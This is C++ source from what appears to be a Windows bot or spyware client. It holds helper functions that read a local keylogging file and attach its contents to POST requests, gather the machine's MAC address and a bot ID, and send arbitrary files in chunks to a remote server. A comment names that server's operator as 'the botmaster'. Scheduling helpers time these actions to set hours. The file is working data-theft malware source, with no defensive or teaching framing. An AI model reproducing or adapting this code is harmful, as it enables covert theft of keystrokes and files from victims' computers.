#include <string>
#include <vector>
#include <time.h>
#include <fstream>
#include <ctime>
#include "UtilLib.h"
#include "HttpLib.h"
#include "DataCollector.h"
#include <Windows.h>
#include <Iphlpapi.h>

#pragma comment (lib, "Wininet.lib")
#pragma comment(lib, "iphlpapi.lib")

//converts a string to a w-string
wstring s2ws(string inString){
	wstring wString;
	return wString.assign(inString.begin(), inString.end());
}

//adds an unsuccessful request to the queue of requests that need to be resent
void queueRequest(vector<vector<string>> &requestQueue, string api, string query){
	vector<string> request = { api, query };
	requestQueue.push_back(request);
}

//returns the size of a vector
int getSize(vector<string> keys){
	return keys.size();
}

//returns the size of a vector<vector>
int getSize(vector<vector<string>> keys){
	return keys.size();
}

void insertOrUpdate(vector<string> &keys, vector<string> &values, string key, string value){
	bool exists = false;
	for (int i = 0; i < getSize(keys) && exists == false; i++){
		if (keys[i].compare(key) == 0){
			exists = true;
			values[i] = value;
		}
	}
	if (!exists){
		keys.push_back(key);
		values.push_back(value);
	}
}

// removes every key/value from the vectors except mac and bot_id
void dumpData(vector<string> &keys, vector<string> &values){
	for (int i = 0; i < getSize(keys); i++){
		if (keys[i] != "bot_id" && keys[i] != "mac_address"){
			keys.erase(keys.begin() + i);
			values.erase(values.begin() + i);
			i--;
		}
	}
}

// removes a key/value pair from the vectors
void removeElement(vector<string> &keys, vector<string> &values, string key_to_remove){
	// iterate over the keys until we find the one we want to removes
	// then remove the element at that index from both vectors
	for (int i = 0; i < getSize(keys); i++){
		if (keys[i] == key_to_remove){
			keys.erase(keys.begin() + i);
			values.erase(values.begin() + i);
			break;
		}
	}
}

bool fileExists(string file){
	bool exists = false;
	ifstream fin;
	fin.open(file, ios::in);

	if (!fin.fail()){
		exists = true;
	}
	fin.close();
	return exists;
}

// makes a copy of file1 called file2
void copyFile(string file1, string file2){
	ifstream fin;
	fin.open(file1, ios::in);

	if (fin.fail()){
		fin.close();
	}else{
		ofstream fout;
		fout.open(file2, ios::out);
		char ch;
		char buffer[1024];

		if (fin.is_open()){
			while (fin.get(ch)){
				fin.get(buffer, 1024);
				fout << buffer;
			}
			fin.close();
			fout.close();
		}
	}
}

string getTimestamp(){
	time_t epoc = time(0);
	struct tm* t = localtime(&epoc);
	string year = to_string(t->tm_year + 1900);
	string month = "";
	if(t->tm_mon + 1 < 10){
		month = "0" + to_string(t->tm_mon + 1);
	}else{
		month = to_string(t->tm_mon + 1);
	}
	string day = to_string(t->tm_mday);
	string hour = to_string(t->tm_hour);
	string min = to_string(t->tm_min);
	string sec = to_string(t->tm_sec);
	string s_time = month + '-' + day + '-' + year
		+ '-' + hour + '-' + min +'-' + sec;
	return s_time;
}

//get input from a keylogging file and append to post request
void readDataFromFile(string path, string filename, char* output, int len){
	ifstream fin;
	fin.open(path + filename, ios::in);
	//fin.open("C:\\Temp\\Data.txt", ios::in);

	if (fin.fail()){
		fin.close();
	}

	ofstream fout;
	fout.open(path + "2" + filename, ios::out);
	char ch;
	char characters[1024];
	memset(characters, 0, 1024);
	memset(output, 0, len);

	if (fin.is_open()){
		fin.get(output, len);

		while (fin.get(ch)){
			fin.get(characters, 1024);
			// printf("chars: %s\n", characters);
			fout << characters;
		}
		fin.close();
		fout.close();
		remove((path + filename).c_str());
		rename((path  + "2" +filename).c_str(), (path + filename).c_str());
	}
}

//converts a list of key/values to a query string
string convertArgsToStr(vector<string> keys, vector<string> values, int arrayLen, bool getRequest){
	// use this variable size string to construct the query
	string query = "";

	if (getRequest && arrayLen > 0)
		query += "?";
	for (int i = 0; i < arrayLen; i++){
		query += keys[i];
		query += "=" + values[i];
		if (i < arrayLen - 1)
			query += "&";
	}
	if (!getRequest){
		char data[10000];
		memset(data, 0, 10000);
		readDataFromFile("C:\\Temp\\", "Data", data, 10000);
		if (strcmp(data, "") != 0){
			query += "&keylogging=";
		 	query += data;
		}
	}
	return query;
}

//searches a list of key/values for a set of specific key/value pairs
string getArgsToString(vector<string> keys, vector<string> values, int length, vector<string> params, int paramLength, char* verb){
	vector<string> tempKeys;
	vector<string> tempValues;
	int tempSize = 0;
	bool mac_address = false;
	//loop through the params we want
	for (int i = 0; i < paramLength; i++){
		//loop through all params
		for (int j = 0; j < length; j++){
			//param is found
			if (keys[j].compare(params[i])==0){
				//add to query key/value list
				tempKeys.push_back(keys[j]);
				tempValues.push_back(values[j]);
				tempSize++;
			}
		}
	}
	//correct optional parameter being added
	if (mac_address){ paramLength++; }
	//number found and param count are the same
	//if (paramLength != tempSize){
	//	string error = "err";
	//	// initialize the array pointer that was passed in to fit the query string created plus space for \0
	//	*output = new char[error.length() + 1];
	//	// copy the string to the new array pointer
	//	strncpy_s(*output, strlen(error.c_str()) + 1, error.c_str(), _TRUNCATE);
	//}
	//else{
		//build get query
		if (strcmp(verb, "GET")==0)
			return convertArgsToStr(tempKeys, tempValues, tempSize, true);
		//build post query
		else if (strcmp(verb, "POST")==0)
			return convertArgsToStr(tempKeys, tempValues, tempSize, false);
	//}
}

bool isInTimeArray(int time, const int timeArray[], int arrayLen) {
	for (int i = 0; i < arrayLen; i++) {
		if (timeArray[i] == time) {
			return true;
		}
	}
	return false;
}

bool waitForTime(const int timeArray[], int arrayLen, const int count) {
	struct tm * now;
	bool fail = false;
	static int t_count = 0;
	do {
		if (fail)	return false;
		//get time
		time_t t = time(0);
		now = localtime(&t);
		//if times do not match and action count has been reached reset count
		if (!isInTimeArray(now->tm_hour, timeArray, arrayLen) && t_count != 0) {
			t_count = 0;
		}
		//return false if the loop goes back to the top
		fail = true;
		//do while the hour is not what we want
	} while (!isInTimeArray(now->tm_hour, timeArray, arrayLen) || t_count == count);

	//do an action
	if (isInTimeArray(now->tm_hour, timeArray, arrayLen) && t_count <= count) {
		t_count++;
	}
	return true;
}

bool waitForPeriod(int wait) {
	time_t t = time(0) + (wait * 60);
	while (time(0) < t) {}
	return true;
}

static const std::string base64_chars =
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
  string ret;
  int i = 0;
  int j = 0;
  unsigned char char_array_3[3];
  unsigned char char_array_4[4];

  while (in_len--) {
    char_array_3[i++] = *(bytes_to_encode++);
    if (i == 3) {
      char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
      char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
      char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
      char_array_4[3] = char_array_3[2] & 0x3f;

      for(i = 0; (i <4) ; i++)
        ret += base64_chars[char_array_4[i]];
      i = 0;
    }
  }

  if (i)
  {
    for(j = i; j < 3; j++)
      char_array_3[j] = '\0';

    char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
    char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
    char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
    char_array_4[3] = char_array_3[2] & 0x3f;

    for (j = 0; (j < i + 1); j++)
      ret += base64_chars[char_array_4[j]];

    while((i++ < 3))
      ret += '=';
  }
  return ret;
}

static inline bool is_base64(unsigned char c) {
  return (isalnum(c) || (c == '+') || (c == '/'));
}

string base64_decode(string const& encoded_string) {
  int in_len = encoded_string.size();
  int i = 0;
  int j = 0;
  int in_ = 0;
  unsigned char char_array_4[4], char_array_3[3];
  std::string ret;

  while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
    char_array_4[i++] = encoded_string[in_]; in_++;
    if (i ==4) {
      for (i = 0; i <4; i++)
        char_array_4[i] = base64_chars.find(char_array_4[i]);

      char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
      char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
      char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

      for (i = 0; (i < 3); i++)
        ret += char_array_3[i];
      i = 0;
    }
  }

  if (i) {
    for (j = i; j <4; j++)
      char_array_4[j] = 0;

    for (j = 0; j <4; j++)
      char_array_4[j] = base64_chars.find(char_array_4[j]);

    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
    char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
    char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

    for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
  }

  return ret;
}

int nStrFind(char* str, string searchTerm, int strLen){
	bool found = false;
	int foundIndex = -1;
	// look at every character in the array
	for(int i = 0; i <= strLen - searchTerm.size(); i++){
		for(int j = 0; j < searchTerm.size(); j++){
			// if the char doesnt match, break and go to next
			if(str[i+j] != searchTerm[j]){
				break;
			}
			// if we got to the end of the searchTerm and every char matched, we found it
			if(j == searchTerm.size() - 1){
				found = true;
			}
		}
		// if the search term was found
		if(found){
			foundIndex = i;
			break;
		}
	}
	return foundIndex;
}

char* getMAC(){
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(AdapterInfo);
	char *mac_addr = (char*)malloc(17);
	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
	}
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		do {
				sprintf(mac_addr, "%02X-%02X-%02X-%02X-%02X-%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1],
				pAdapterInfo->Address[2], pAdapterInfo->Address[3],
				pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
				return mac_addr;
				pAdapterInfo = pAdapterInfo->Next;
		} while (pAdapterInfo);
	}
	free(AdapterInfo);
}


void sendFile(string url, int port, string api, DataCollector* dac, string path){
			// a buffer to store data read from the file
			char readBuffer[8192];
			memset(readBuffer, 0, 8192);
			// use the DataCollector to get the basic part of the POST query ready
			// 'mac=##-##&bot_id=#&contents='
			string queryString = dac->getFileQuery(path);
			printf("query : %s\n", queryString.c_str());
			int queryStringSize = queryString.size();
			// int fullQuerySize = queryStringSize + 6 + path.length() + 10 + 8192;
			int fullQuerySize = queryStringSize + 8192;
			char* fullQuery = new char[fullQuerySize];

			// another array for the encoded query, it will wrap the standard query in a 'request=xxxxxxx'
			int encodedQueryStart = 8;
			char* encodedQuery = new char[queryStringSize + encodedQueryStart];
			strncpy(encodedQuery, "request=", encodedQueryStart);

			memset(fullQuery, 0, fullQuerySize);
			strncpy(fullQuery, queryString.c_str(), queryStringSize);
			printf("fullQuery: %s\n", fullQuery);
			int endOfPrintableChars = queryStringSize;

			// open the file at the end, to get the file sizeof
			ifstream inSize(path, ios::ate);
			if(inSize.fail()){
				// this could be b/c the file failed to open or it does not exist
				// but send 'exists=false' to the botmaster to let them know it failed
				// add 3 to prepare for replacing the 'contents=' with 'exists=false'
				char* newChar = new char[queryStringSize + 3];
				// write everything but contents= to the new buffer
				memcpy(newChar, fullQuery, queryStringSize - 9);
				strcpy(newChar + queryStringSize - 9, "exists=false");
				printf("stuff %s\n", newChar);
				httpPostRequest(url, api, port, newChar, queryStringSize + 3);
				delete newChar;
				return;
			}
			int numOfFullReads = inSize.tellg() / 8192;
			// oddChars is the number of bytes that are at the end of a file
			// that dont fit into an even block, we need to read exactly the number
			// of bytes, or else it will pad with zeros which is not valid
			int oddChars = inSize.tellg() % 8192;
			inSize.close();
			// open the file for reading binary data
			ifstream in(path, ios::binary);
			if(in.fail())
				return;
			// read 8K from the file
			in.read(readBuffer, 8192);

			int count = 0;
			printf("number of reads %d\n", numOfFullReads);
			printf("number of odd chars %d\n", oddChars);
			// read x number of full blocks of data
			// go to <= since we will check for this and potentially read a partial block
			for(int i = 0; i <= numOfFullReads; i++){
				if(i < numOfFullReads){
					for(int j = 0; j < 8192; j++){
						// printf("hex: %x ", readBuffer[j]);
						fullQuery[endOfPrintableChars+j] = readBuffer[j];
					}
					// strncpy(encodedQuery + encodedQueryStart, fullQuery, fullQuerySize);
					// string encodedStr = base64_encode((unsigned char*)fullQuery, queryStringSize);
					// printf("encoded: %s\n", encodedStr.c_str());
					// // memcpy(encodedQuery + encodedQueryStart, encodedStr.c_str(), fullQuerySize);
					string res = httpPostRequest(url, api, port, fullQuery, fullQuerySize);
				}
				// if we are 1 past the number of full blocks, is there partial data to sned
				else if(oddChars > 0){
					for(int j = 0; j < oddChars; j++){
						// printf("hex: %x ", readBuffer[j]);
						fullQuery[endOfPrintableChars+j] = readBuffer[j];
					}
					int charsLessThanFull = 8192 - oddChars;
					string res = httpPostRequest(url, api, port, fullQuery, fullQuerySize - charsLessThanFull);
				}

				// clear the buffer, if the file only has 500 bytes for example we dont want old data at the end
				memset(readBuffer, 0, 8192);
				in.read(readBuffer, 8192);
				printf("send index%d\n", i);
			}
		in.close();
		// free the memory for the query array
		delete fullQuery;
		delete encodedQuery;
	// }
}

bool notDone(int currentCount, int limit){
	static bool overflowed = false;
	// -1 signifies unlimited actions

	if(limit == -1){
		return true;
	}
	// if we have overflowed, its reached the limit
	else if(overflowed){
		return false;
	}
	// handle overflow
	else if(currentCount < 0 && !overflowed){
		overflowed = true;
	}else if(currentCount < limit){
		return true;
	}else{
		return false;
	}
}
